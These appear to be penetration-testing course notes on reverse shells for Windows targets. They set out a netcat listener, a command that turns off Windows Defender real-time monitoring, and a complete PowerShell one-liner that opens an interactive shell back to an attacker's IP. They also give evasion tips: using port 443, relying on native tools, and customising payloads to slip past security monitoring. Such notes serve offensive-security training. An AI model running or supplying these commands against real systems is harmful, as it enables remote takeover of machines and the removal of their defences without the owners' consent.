# Reverse Shells

A **reverse shell** requires the attack machine to run a listener while the target initiates the connection back to the attacker. This technique is preferred because **outbound connections** are frequently overlooked by administrators and are more likely to bypass firewall restrictions compared to bind shells.

### Methodology & Decision Logic

- **When to use:** Use when inbound connections to the target are blocked by a firewall but outbound traffic is permitted.
- **Port Selection:** Utilize **common ports** like **443** (HTTPS) for the listener. This ensures the connection is less likely to be blocked by OS or network-level firewalls, as these ports are typically open for standard business operations.
- **Tool Selection:** Prioritize **native tools** (Living Off the Land) such as **PowerShell** on Windows targets. Non-native tools like Netcat require transferring binaries, which is difficult without initial file upload capabilities and increases the chance of detection.
- **Evasion Note:** While common ports bypass basic firewall rules, firewalls with **Deep Packet Inspection (DPI)** or Layer 7 visibility may still detect and block reverse shells by examining packet contents.

---

### Operational Workflow

1. **Start a Listener:** Prepare the attack machine to receive the connection.
2. **Prepare the Target:** If required for the scenario/demonstration, disable security software that blocks malicious scripts.
3. **Execute Payload:** Run the reverse shell command on the target system to initiate the connection.

---

### Command Reference

#### Attack Box Listener

Use Netcat to listen for incoming connections from the target.

|Parameter|Description|
|:--|:--|
|`-l`|Listen mode, for inbound connects|
|`-v`|Verbose|
|`-n`|Numeric-only IP addresses, no DNS|
|`-p`|Local port number|

```
sudo nc -lvnp <PORT>
```

#### Windows Target: Defensive Disable

If **Windows Defender** blocks the payload execution with a "ScriptContainedMaliciousContent" error, real-time monitoring may need to be disabled from an administrative PowerShell console.

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Windows Target: PowerShell Reverse Shell

This one-liner uses native .NET objects to create a TCP client and redirect the shell stream to the attack machine.

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACK_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

### Attack Implications & Considerations

- **Payload Customization:** Security teams often monitor public repositories (like Reverse Shell Cheat Sheets). Customizing payloads may be necessary to bypass tuned security controls.
- **UI Constraints:** When using Pwnbox, the browser clipboard might not paste correctly into the target CLI; paste into the target's **Notepad** first as an intermediate step.
- **Access Level:** Successful execution provides interactive access to the OS and file system, indicated by a prompt change (e.g., `PS C:\>`).